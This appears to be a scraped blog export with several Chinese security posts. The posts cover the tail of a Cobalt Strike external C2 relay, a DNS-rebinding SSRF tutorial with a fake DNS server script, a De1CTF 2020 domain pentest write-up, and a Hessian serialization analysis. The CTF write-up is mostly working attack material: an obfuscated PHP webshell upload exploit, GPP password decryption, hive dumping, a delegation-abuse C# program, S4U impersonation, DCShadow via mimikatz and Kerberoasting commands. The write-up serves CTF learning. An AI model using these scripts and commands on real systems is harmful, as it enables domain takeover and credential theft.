buffer); Console.WriteLine(&quot;Read from beacon {0}.&quot;, length); write_frame(writer, buffer); buffer = &quot;&quot;; } } //read data from own pipe and write into beacon public static void WriteOnlyPipeProcess(StreamReader reader, StreamWriter writer) { string buffer = &quot;&quot;; while (true) { Console.WriteLine(&quot;Beacon want read.&quot;); uint length = read_frame(reader, buffer); Console.WriteLine(&quot;Write to beacon {0}.&quot;, length); write_frame(writer, buffer); buffer = &quot;&quot;; } } }} 参考C#学习笔记2：多线程解析C#中管道流的使用StreamReader.Read MethodA C# Named Pipe Library That Supports Multiple ClientsCommunicationServers/Pipe/","link":"/2019/10/25/CobaltStrike%20External%20C2%E4%BF%A1%E9%81%93/"},{"title":"DNS rebinding","text":"DNS rebinding是啥利用服务器两次解析同一域名的短暂间隙，更换域名背后的ip达到突破同源策略或过waf进行ssrf的目的。 举个例子一般，进行ssrf防御的模式如下。 获取到输入的URL，从该URL中提取host 对该host进行DNS解析，获取到解析的IP 检测该IP是否是合法的，比如是否是私有IP等 如果IP检测为合法的，则进入curl的阶段发包 这样的逻辑是有问题的，因为第二次服务端完全可以不使用url就是使用已被检查过的ip。 诚如前面所说同一url被用了两次，所以完全可以将TTL调到一个非常小的值，让第一次通过url拿到的ip失效，然后在curl的时候服务端必须再进行一次dns解析拿到ip，而这个ip没有被检查，于是就可以为所欲为了。在ssrf里面就是第一次解析出外网ip，第二次解析出内网ip。 一个demo要实现dns重绑定一个重要的条件就是将TTL调到接近0的数字，一般的域名服务商是不允许TTL那么低的。所以只有自己搭或者自己写一个dns服务器。这里选择使用fakedns做一个简单的实验初体验。 vi一个dns.conf写 1A cl0und.site 12.34.56.78,127.0.0.1 然后分别dig两次 1dig @fakedns所在的ip cl0und.site 完整复现当然比赛或者实战里面是不可能自己任意指定dns服务器解析，所以必须自己配置dns记录。貌似阿里是可以配置ns记录的。我用的国外的域名服务商貌似比较坑设置nameserver那里不允许用ip。 不讲道理，纠结了半天最后在ip后面加xip.io绕过。 nameserver更新的比较慢要半个小时左右。 半个小时以后~可以看到成功是成功了，但是ttl有300实战中应该是不可接受的。但是看源码的时候发现ttl设置的1,很迷 所以去网上偷了一个脚本 123456789101112131415161718192021222324252627282930313233343536from twisted.internet import reactor, deferfrom twisted.names import client, dns, error, serverrecord={}class DynamicResolver(object): def _doDynamicResponse(self, query): name = query.name.name if name not in record or record[name]&lt;1: ip=\"12.34.56.78\" else: ip=\"127.0.0.1\" if name not in record: record[name]=0 record[name]+=1 print name+\" ===&gt; \"+ip answer = dns.RRHeader( name=name, type=dns.A, cls=dns.IN, ttl=0, payload=dns.Record_A(address=b'%s'%ip,ttl=0) ) answers = [answer] authority = [] additional = [] return answers, authority, additional def query(self, query, timeout=None): return defer.succeed(self._doDynamicResponse(query))def main(): factory = server.DNSServerFactory( clients=[DynamicResolver(), client.Resolver(resolv='/etc/resolv.conf')] ) protocol = dns.DNSDatagramProtocol(controller=factory) reactor.listenUDP(53, protocol) reactor.run()if __name__ == '__main__': raise SystemExit(main()) 开始安装twisted库失败，安装之前要先装一下，备忘 1apt-get install build-essential autoconf libtool pkg-config python-opengl python-imaging python-pyrex python-pyside.qtopengl idle-python2.7 qt4-dev-tools qt4-designer libqtgui4 libqtcore4 libqt4-xml libqt4-test libqt4-script libqt4-network libqt4-dbus python-qt4 python-qt4-gl libgle3 python-dev 12pip install twisted==16.6.0pip install service-identity==16.0.0 后来推断应该是操作的系统的锅，空白的那一次实际上是解析出东西了的。300秒貌似是操作系统强制的（？）。 但是实际上已经成功了，在kali和centos上测了一下都是这个结果。 不稳定的偷懒方法法一这个方法不需要，有自己的域名和nameserver。因为有人已经帮大家实现了。只需要把想用的ip转换成16进制，比如想在127.0.0.1 和 192.168.0.1互换那么只需要，键入ip7f000001.c0a80001.rbndr.us 然后就是看脸了。随机试了一轮 123456789101112131415161718192021222324252627282930313233343536373839404142[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 127.0.0.1[root@localhost redis]# host 7f000001.c0a80001.rbndr.us7f000001.c0a80001.rbndr.us has address 192.168.0.1 法二在bendawang师傅的博客看到的自己设置两个A记录一个内网,一个外网。去装外网先返回内网后返回这个概率。 参考http://www.bendawang.site/2017/05/31/%E5%85%B3%E4%BA%8EDNS-rebinding%E7%9A%84%E6%80%BB%E7%BB%93/ https://ricterz.me/posts/Use%20DNS%20Rebinding%20to%20Bypass%20IP%20Restriction?_=1485134878505 https://github.com/taviso/rbndr/","link":"/2018/01/28/DNS%20rebinding/"},{"title":"De1tactf2020 pentest非预期解与预期解","text":"pentest1先是一个有绕过的文件上传，这部分是其他小伙伴做的直接给exp了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144import requestsimport reimport sysurl='http://47.113.219.76/index.php'headers={ 'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryhJUhA4FiLizuakBx'}data=\"\"\"------WebKitFormBoundaryhJUhA4FiLizuakBxContent-Disposition: form-data; name=\"file\"; filename=\"{}\"Content-Type: image/jpeg{}------WebKitFormBoundaryhJUhA4FiLizuakBxContent-Disposition: form-data; name=\"submit\"submit------WebKitFormBoundaryhJUhA4FiLizuakBx--\"\"\"payload=\"\"\"&lt;?=$_=[]?&gt;&lt;?=$_=@\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$___=$_?&gt;&lt;?=$____=$_?&gt;&lt;?=$_____=$_?&gt;&lt;?=$______=$_?&gt;&lt;?=$_______=$_?&gt;&lt;?=$________=$_?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$__?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$___?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$____?&gt;&lt;?=++$_____?&gt;&lt;?=++$_____?&gt;&lt;?=++$_____?&gt;&lt;?=++$_____?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=++$_______?&gt;&lt;?=$________='_'?&gt;&lt;?=$_________=$__.$___.$__.$____.$_____.$______?&gt;&lt;?=$__________=$________.$_______.$_____.$____?&gt;&lt;?=$____________________=$$__________?&gt;&lt;?=$____________________[_]($____________________[__],$____________________[___])?&gt;\"\"\"data=data.format(\"syc.pHp\",payload)r=requests.post(url=url,headers=headers,data=data)filename=re.search(\"in:(uploads/.*)\",r.text).group(1)filename=filename.strip()print(\"http://47.113.219.76/\"+filename)r=requests.get(\"http://47.113.219.76/\"+filename+\"?_=file_put_contents&amp;__=1.php&amp;___=&lt;?php eval($_POST[a]);?&gt;\")print(r.status_code)print(r.text) 打完访问对应目录是下的1.php，密码是a。 连上webshell后把shell反弹到cs上，使用powerview进行信息收集可以看到，域内共享有一个hint。 12powershell-import /Users/cengsiqi/Desktop/pentest/wintool/PowerView-dev.ps1powershell get-domaincomputer|get-netshare 查看这个Hint可以发现，有一个拿flag的tip。 1shell dir \\\\dc.De1CTF2020.lab\\Hin 把提示拷贝下来下载发现这个zip需要密码才能打开。 1shell copy \\\\dc.De1CTF2020.lab\\Hint\\flag1_and_flag2hint.zip . 接着收集，域内用户信息发现有一个可疑用户。 1shell net user /dom 猜测HintZip_Pass账户密码就是解压缩的密码。这里经过一些尝试之后考虑会不会是gpp尝试ps直接导出，发现爆了个错，看意思是说当前用户不是domain user（客观事实是当前账户就是域用户）。 12powershell-import /Users/cengsiqi/Desktop/pentest/Get-GPPPassword.ps1powershell Get-GPPPassword 也不会改powershell，就直接手动遍历SYSVOL了（还好不是很多，多的话建议弹到msf上用msf的脚本搞） 123&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"HintZip_Pass\" image=\"2\" changed=\"2020-04-15 14:43:23\" uid=\"{D33537C1-0BDB-44B7-8628-A6030A298430}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" changeLogon=\"1\" noChange=\"0\" neverExpires=\"0\" acctDisabled=\"0\" userName=\"HintZip_Pass\"/&gt;&lt;/User&gt;&lt;/Groups&gt; 1gpp-decrypt uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08 用zL1PpP@sSwO3d解密刚才的压缩包flag1_and_flag2hint.zip即可得到，第一个flag和下一关的提示。 pentest2123456789flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}Get flag2 Hint:hint1: You need De1ta user to get flag2hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].hint3: Pay attention to the extended rights of De1ta user on the domain.hint4: flag2 in Domain Controller (C:\\Users\\Administrator\\Desktop\\flag.txt)PS: Please do not damage the environment after getting permission, thanks QAQ. 从提示可以看出来，出题的思路是，通过某种离线爆破的方法拿到De1ta密码，De1ta用户存在acl滥用问题以至于可以搞到域控拿下读到C:\\Users\\Administrator\\Desktop\\flag.txt。 关于如何离线爆破我这里是非预期，之前服务器web账号有特权可以juicypotato提权。我一直没成功。当时有其他师傅成功，给我弹了个system shell。导出De1ta账户的mscach 1234reg save hklm\\system system.hivereg save hklm\\security security.hivepython secretsdump.py -security /Users/cengsiqi/Desktop/hash/security.hive -system /Users/cengsiqi/Desktop/hash/SYSTEM.hive LOCAL 可以拿到 1DE1CTF2020.LAB/De1ta:$DCC2$10240#De1ta#52c2cfff23d879a2ba830cf184c10b46 根据提示的密码复杂度，用hascat跑出来结果是3f23ea12。 密码有了下一步根据提示来Delta acl滥用问题。 12powershell-import /Users/cengsiqi/Desktop/pentest/wintool/PowerView-master.ps1powershell Get-ObjectAcl -Domain De1CTF2020.lab -ResolveGUIDs|?{$_.IdentityReference -eq &quot;DE1CTF2020\\De1ta&quot;} 输出出来了很多东西重点关注两个地方，第一个地方是De1ta的ExtendedRight让他具备Dcshadow的攻击的能力。 通过查阅资料可以知道Dcshadow攻击时需要De1ta这种特权账号和一个SYSTEM账号。做到这里的时候juciypotato已经修了，之前抓的administrator hash也改了。（经验不丰富，如果之前抓了机器hash也能提权了）。 接下来就需要关注第二个地方了。De1ta用户对DM机器具有WriteProperty，环境又是12，所以可以用烂番茄提权。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126using System;using System.Text;using System.Security.AccessControl;using System.Security.Principal;using System.Net;namespace Addnew_MachineAccount{ class Program { static void Main(string[] args) { String DomainController = \"192.168.0.12\"; String Domain = \"De1CTF2020.lab\"; String new_MachineAccount = \"lisan4\"; //添加的机器账户 String new_MachineAccount_password = \"sycl0ver\"; //机器账户密码 String victimcomputer = \"DM\"; //需要进行提权的机器 String victimcomputer_ldap_path = \"LDAP://CN=DM,CN=Computers,DC=De1CTF2020,DC=lab\"; String machine_account = new_MachineAccount; String sam_account = machine_account + \"$\"; String distinguished_name = \"\"; String[] DC_array = null; distinguished_name = \"CN=\" + machine_account + \",CN=Computers\"; DC_array = Domain.Split('.'); foreach (String DC in DC_array) { distinguished_name += \",DC=\" + DC; } Console.WriteLine(\"[+] Elevate permissions on \" + victimcomputer); Console.WriteLine(\"[+] Domain = \" + Domain); Console.WriteLine(\"[+] Domain Controller = \" + DomainController); //Console.WriteLine(\"[+] New SAMAccountName = \" + sam_account); //Console.WriteLine(\"[+] Distinguished Name = \" + distinguished_name); //连接ldap System.DirectoryServices.Protocols.LdapDirectoryIdentifier identifier = new System.DirectoryServices.Protocols.LdapDirectoryIdentifier(DomainController, 389); //NetworkCredential nc = new NetworkCredential(username, password); //使用凭据登录 System.DirectoryServices.Protocols.LdapConnection connection = null; //connection = new System.DirectoryServices.Protocols.LdapConnection(identifier, nc); connection = new System.DirectoryServices.Protocols.LdapConnection(identifier); connection.SessionOptions.Sealing = true; connection.SessionOptions.Signing = true; connection.Bind(); var request = new System.DirectoryServices.Protocols.AddRequest(distinguished_name, new System.DirectoryServices.Protocols.DirectoryAttribute[] { new System.DirectoryServices.Protocols.DirectoryAttribute(\"DnsHostName\", machine_account +\".\"+ Domain), new System.DirectoryServices.Protocols.DirectoryAttribute(\"SamAccountName\", sam_account), new System.DirectoryServices.Protocols.DirectoryAttribute(\"userAccountControl\", \"4096\"), new System.DirectoryServices.Protocols.DirectoryAttribute(\"unicodePwd\", Encoding.Unicode.GetBytes(\"\\\"\" + new_MachineAccount_password + \"\\\"\")), new System.DirectoryServices.Protocols.DirectoryAttribute(\"objectClass\", \"Computer\"), new System.DirectoryServices.Protocols.DirectoryAttribute(\"ServicePrincipalName\", \"HOST/\"+machine_account+\".\"+Domain,\"RestrictedKrbHost/\"+machine_account+\".\"+Domain,\"HOST/\"+machine_account,\"RestrictedKrbHost/\"+machine_account) }); try { //添加机器账户 connection.SendRequest(request); Console.WriteLine(\"[+] Machine account: \" + machine_account + \" Password: \" + new_MachineAccount_password + \" added\"); } catch (System.Exception ex) { Console.WriteLine(\"[-] The new machine could not be created! User may have reached ms-DS-new_MachineAccountQuota limit.)\"); Console.WriteLine(\"[-] Exception: \" + ex.Message); return; } // 获取新计算机对象的SID var new_request = new System.DirectoryServices.Protocols.SearchRequest(distinguished_name, \"(&amp;(samAccountType=805306369)(|(name=\" + machine_account + \")))\", System.DirectoryServices.Protocols.SearchScope.Subtree, null); var new_response = (System.DirectoryServices.Protocols.SearchResponse)connection.SendRequest(new_request); SecurityIdentifier sid = null; foreach (System.DirectoryServices.Protocols.SearchResultEntry entry in new_response.Entries) { try { sid = new SecurityIdentifier(entry.Attributes[\"objectsid\"][0] as byte[], 0); Console.Out.WriteLine(\"[+] \" + new_MachineAccount + \" SID : \" + sid.Value); } catch { Console.WriteLine(\"[!] It was not possible to retrieve the SID.\\nExiting...\"); return; } } //设置资源约束委派 System.DirectoryServices.DirectoryEntry myldapConnection = new System.DirectoryServices.DirectoryEntry(\"De1CTF2020.lab\",\"De1ta\", \"3f23ea12\"); myldapConnection.Path = victimcomputer_ldap_path; myldapConnection.AuthenticationType = System.DirectoryServices.AuthenticationTypes.Secure; System.DirectoryServices.DirectorySearcher search = new System.DirectoryServices.DirectorySearcher(myldapConnection); //通过ldap找计算机 search.Filter = \"(CN=\" + victimcomputer + \")\"; string[] requiredProperties = new string[] { \"samaccountname\" }; foreach (String property in requiredProperties) search.PropertiesToLoad.Add(property); System.DirectoryServices.SearchResult result = null; try { result = search.FindOne(); } catch (System.Exception ex) { Console.WriteLine(ex.Message + \"Exiting...\"); return; } if (result != null) { System.DirectoryServices.DirectoryEntry entryToUpdate = result.GetDirectoryEntry(); String sec_desc = \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;\" + sid.Value + \")\"; System.Security.AccessControl.RawSecurityDescriptor sd = new RawSecurityDescriptor(sec_desc); byte[] riptor_buffer = new byte[sd.BinaryLength]; sd.GetBinaryForm(riptor_buffer, 0); // 添加evilpc的sid到msds-allowedtoactonbehalfofotheridentity中 entryToUpdate.Properties[\"msds-allowedtoactonbehalfofotheridentity\"].Value = riptor_buffer; try { entryToUpdate.CommitChanges();//提交更改 Console.WriteLine(\"[+] Exploit successfully!\"); } catch (System.Exception ex) { Console.WriteLine(ex.Message); Console.WriteLine(\"[!] \\nFailed...\"); return; } } } }} 因为环境很混乱几个队伍都在相互覆盖msds-allowedtoactonbehalfofotheridentity，所以先后添加了多个spn。。lisan3$ lisan4$加上委派之后然后就是s4u提权了。这里踩了大坑，下面来说一下。我先用的kekeo。 12tgt::ask /user:lisan3$ /domain:De1CTF2020.lab /ntlm:30a7b270355d67451970d37ff1c9b666tgs::s4u /tgt:TGT_lisan3$@DE1CTF2020.LAB_krbtgt~De1CTF2020.lab@DE1CTF2020.LAB.kirbi /user:Administrator@De1CTF2020.lab /service:cifs/DM.De1CTF2020.lab S4U2self成功S4U2Proxy失败（当时反复确认过委派加上了的） 换个工具rubues但是dir始终不成功（后来问了一个师傅答复是：访问自己本身默认都是用当前用户身份去认证，不走网络认证，必须得主动调用网络认证才行）。走到这里天色已晚有点肝不动了，就没继续了。第二天比赛结束出题师傅给我说用impakect就可以s4u而且能成。 12345proxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -spn cifs/dm.De1CTF2020.lab De1CTF2020/lisan4$export KRB5CCNAME=/root/impacket-master/examples/lisan4$.ccacheproxychains getST.py -hashes 30a7b270355d67451970d37ff1c9b666:30a7b270355d67451970d37ff1c9b666 -k -impersonate Administrator -spn cifs/dm.De1CTF2020.lab De1CTF2020/lisan4$export KRB5CCNAME=/root/impacket-master/examples/Administrator.ccacheproxychains psexec.py -k -no-pass dm.De1CTF2020.lab 这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。这里一定注意要用fqdn（dm.De1CTF2020.lab）来请求，不要用ip。有system权限后就是Dcshadow的操作了 system权限下 1shell mimikatz.exe &quot;!+&quot; &quot;!processtoken&quot; &quot;lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512&quot; 我一直以为这种非交互式的mimkatz运行完会被beacon自动关闭掉，实际测下来并不会。De1ta权限下 1shell mimikatz.exe &quot;lsadump::dcshadow /push&quot; &quot;exit&quot; 执行完后system那边会有反应 1shell net group &quot;domain admins&quot; /domain 会发现加上了照理可以直接dir了但是最后还是有一个莫名其妙的坑（忽视图中把路径写错了，不过不影响这里的意思就是没权限，路径不存在是另外一个报错）用rubues重新来一次tgt就好了 12shell Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /pttshell type \\\\dc\\c$\\users\\Administrator\\Desktop\\flag.txt 来说说预期解拿到De1ta账号密码 1shell setspn -s http/DM.De1CTF2020.lab De1CTF2020\\De1ta 1shell cscript GetUserSPNs.vbs 12powershell-import /Users/cengsiqi/Desktop/pentest/Empire/data/module_source/credentials/Invoke-Kerberoast.ps1powershell Invoke-Kerberoast 123456789101112131415161718192021222324252627282930313233343536373839404142TicketByteHexStream : Hash : $krb5tgs$http/DM.De1CTF2020.lab:0B5E0028717C31BF16F95DDF CA441A51$A71E43FD37E2E10E3029FE2767B0266CCABE13F68B27A46 955A440DA3F3B4AF1D4C7A8C357B69655364C27DA73C80FBE9075A94 615EB720E7A3E1E8610A1C18962338E87479D0A17D902B904B4DE4B5 AD3BAE015D3709899570BD6D25392C9E98345535523CCBE65125B0E7 1F2482040F2347DD13B7062B8A9E6DAA5C79F2843A2F030BBA0DCA91 8FFEEE32D61BCAF4453315AAED98A427CF843C71EDB3EFBD2F47EF83 9229E51A6A10A9D180B6EAF698B9C5D446F61BCA21E59413EC380A3F 426F941EA42704B7262812E44FA1F04F05DAFF0E06B5690538D3BB8B 10263FE97E05D6FE9F9E5BF1EFFF6A0344FA8F8B20CC0AA39BF95538 4C3B543BF9B9A4E23C8F071D24E846F284A6FE62278E76ED47897FB2 3264CC57A7EDE8C613EAD87914C511F2554AAEA6F663E66B8BA0760C 296F82253303A5FF2DF5F8343AD2097F57B376BF83C302D806D620B9 8ED2D3C53DF65AE37A7D6356EFC1A9123CCF56549A5288C132E3F5D0 5A066CE50FFCB654BF79FD5F673175F9AD98C1140E8B50D0F574080A 48EADBFBB00668B96A79F95E429CC42B4BD3CA2C9A106CD6D39312D9 BD13B4452861E47DD71F36D3DAD4A570480D56BDEF1F278518219FA2 5D076758B994C5F4EC8CF49C85DA1CFFAC91DF63AB5D71EF5135CD36 D54FCB9C2A9EF61D67A3BC01EF668F255A66487F3493BE0F8352EAFF A009D561BE459F1130C6A3AF81060FD82232B3E430A196C5580FBDBB 3EEAC6AA6FD2774063CB16C1CB161B20CD6ED3BF414349DECCCF8753 9CE1EEBC28DD27DCE32752640F22817286211841DE22191300D75970 D721021FA1211FA368A14EACEBABA5B42B1F3B087CE04782A695F046 1CCCDC1445DE56D31582825E2824E47499C91A396D867A4284C4DD40 AD1E1AF7A2073729FCB66A52C076A7F3515C93F54189CBDAAF408838 736CA682CFF82CBA4DBFF757CD297CC16FF0A8F6F7C9F206ACB5BB87 61C54AD1635572C16E6FC01B40E6F84F71153514EA21A87B28358A38 4B3ECA5206F35EE3732DADE97726E07E8FEBE3D7EE3A77A2A4EEE1BE 59F4EC5336E4F65D2A4F111C79A73D24F9BDFCCBEAEAC5768538EFAD 00A191BB7941DF4A441BB83D061D42CB59D03A61921117DB835AA1D0 DEB00AD6BC4A694CC39A465CF23447D7CDB1F19EBFCB92C555E75CE6 7999B76A4FE22D1D34AF706A1505DC027D8BDC8A0055095605255BB8 F437551248B77A559463C39934A6A95F183DD1FF5C4152949C0B6F69 6C4B6A649A4B207CE4202B8884F54C1BC9ECA86F966EF2B86F3A89D3 1E07C880C5E5DBCD35338FB485A46E74779D45BF38E2398A16377C15 43E32DACFF71713DBF7288640AA751FC5A51B8DF873BBEB1F946331C CF59E6FC4209322D9BCAB8C51F5B408545BA9C4DA11755B4477DF968 90F72E86D900D78BE6006BD14E1380725D1D8SamAccountName : De1taDistinguishedName : CN=De1ta,CN=Users,DC=De1CTF2020,DC=labServicePrincipalName : http/DM.De1CTF2020.lab 1hashcat -m 13100 -a 0 kerberos.txt cracks.txt ps：用ps也可以GetSPNUser 12powershell-import /Users/cengsiqi/Desktop/pentest/wintool/kerberoast/GetUserSPNs.ps1powershell GetUserSPNs","link":"/2020/05/05/De1tactf2020-pentest%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3%E4%B8%8E%E9%A2%84%E6%9C%9F%E8%A7%A3/"},{"title":"Hessian 序列化代码分析及业务场景学习","text":"介绍Hessian是一个轻量级的remotingonhttp工具，使用简单的方法提供了RMI的功能。早在08年有人做过测试：一个UserData类，有一个字符串属性，一个日期属性,一个double属性，分别用java,hessian来序列化一百万次,结果让人吃惊,不止是hessian序列化的速度要比java的快上一倍，而且hessian序列化后的字节数也要比java的少一倍。 序列化序列化宏观来看就四步 建立进行序列化的工厂类 用工厂类找到要要进行序列化类对应的序列化器 序列化器对将进行序列化的对象进行内省 内省完成后调用序列化器的writeObject（writeObject中按照一定规则把数据写入byte流） 下面用Hessian简单序列化一个对象来看 123456789101112131415161718192021222324import com.caucho.hessian.io.HessianOutput;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.Serializable;class User implements Serializable { String name; int age; User() { age = 18; name = \"cl0und\"; }}public class HessianTest { public static void main(String[] args) throws IOException { User user = new User(); ByteArrayOutputStream os=new ByteArrayOutputStream(); HessianOutput output=new HessianOutput(os); output.writeObject(user); }} 建立进行序列化的工厂类把ByteArrayOutputStream放入了HessianOutput中典型的装饰器模式。 新建序列工厂类（后续会通过工厂类来寻找类的对应序列化器）。 工厂类的创建过程中，在类静态块中加入了java各种类型的反序列器以及和Hessian有关的反序列器。这里和序列化没关系，只是提一嘴。 在类初始化完成后，正式进入SerializerFactory的构造方法。可以看到SerializerFactory允许不安全的序列化，设置默认的上下文工厂类是_contextFactory，这个_contextFactory是生产序列化器的工厂。 用工厂类找到要要进行序列化类对应的序列化器根据传入类型获取相应的序列化器。 获取序列化器的规则是如果_cachedSerializerMap里面又就直接从里面取，如果没有就用loadSerializer找，找出来的加入_cachedSerializerMap避免二次加载。 loadSerializer找的逻辑是先看有没有其它工厂类，如果有就用，如果没有就用_contextFactory造。 因为User是自建类型_contextFactory造不出对应序列化器。 下一步尝试getCustomSerializer来找序列化器，看方法的意思应该是找是否有客户自己定制的序列化器。生成序列器规则是：如果_customSerializerMap有就直接返回，如果没有就按照_类名+HessianSerializer_的规则来找。很遗憾我们并没有对User做个性化定制。 因为没有我们没有对User做个性化的序列化器，所以最后会调用getDefaultSerializer来返回默认序列化器。又因为User既不是内置类也不是和hessian有关的特殊类但是允许了不安全的序列化，所以最后被选中的序列化器是UnsafeSerializer。 序列化器对序列化对象进行内省在构造方法中使用introspect进行内省。 introspect最后几步是在为类里面的属性找序列化器（getFiledSerializer）。 比如这里User类中name属性是String，就创建针对String的序列化器。 String的序列化器包含了field类及其偏移量。 创建类及及其字段序列化器后一路向外传，然后调用writeObject。 writeObjectBegin 写了Object的魔术头、长度、类名writeObject10 负责序列化字段 先是写要序列化的字符串魔术值、字段名长度、字段名，其中 os.write(83) 代表 S 代表字符串。 String类型学序列化的时候 int类型序列化的时候 最后的结果 业务场景环境搭建说穿了就是RPC，用实际的代码来看看pom.xml加入 12345678910111213&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.11&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.caucho&lt;/groupId&gt; &lt;artifactId&gt;hessian&lt;/artifactId&gt; &lt;version&gt;4.0.60&lt;/version&gt; &lt;/dependency&gt;&lt;/dependencies&gt; web.xml 1234567891011121314151617181920&lt;!DOCTYPE web-app PUBLIC \"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN\" \"http://java.sun.com/dtd/web-app_2_3.dtd\" &gt;&lt;web-app&gt; &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt; &lt;servlet&gt; &lt;servlet-name&gt;HessianServlet&lt;/servlet-name&gt; &lt;servlet-class&gt;com.caucho.hessian.server.HessianServlet&lt;/servlet-class&gt; 